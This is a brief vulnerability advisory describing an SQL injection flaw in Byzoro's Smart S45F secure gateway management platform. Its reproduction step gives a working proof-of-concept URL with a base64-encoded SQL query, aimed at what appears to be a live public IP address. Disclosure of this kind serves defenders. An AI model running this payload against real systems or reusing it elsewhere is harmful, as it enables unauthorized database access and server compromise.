Byzoro's Smart S45F Multi-Service Secure Gateway Intelligent Management Platform has a front-end SQL injection vulnerability.

## 1. Vulnerability Description:
Beijing Byzoro Network Technology Co., Ltd. (hereinafter referred to as Byzoro Network) is a high-tech company committed to building the next generation of secure internet.
Byzoro's Smart S45F Multi-Service Secure Gateway Intelligent Management Platform has an SQL injection vulnerability. Attackers can exploit this vulnerability to access sensitive database information, obtain server permissions, and manipulate server files.

## 2. Affected Component:
Smart S45F

## 3. Vulnerability Location:
/importexport.php

## 4. Vulnerability Reproduction:
IP: https://103.121.164.62:8443/

As shown in the login interface.

Construct POC, successfully obtaining the database name and version:
https://103.121.164.62:8443/importexport.php?sql=c2VsZWN0IDEsZGF0YWJhc2UoKSx2ZXJzaW9uKCk=&type=exportexcelbysql
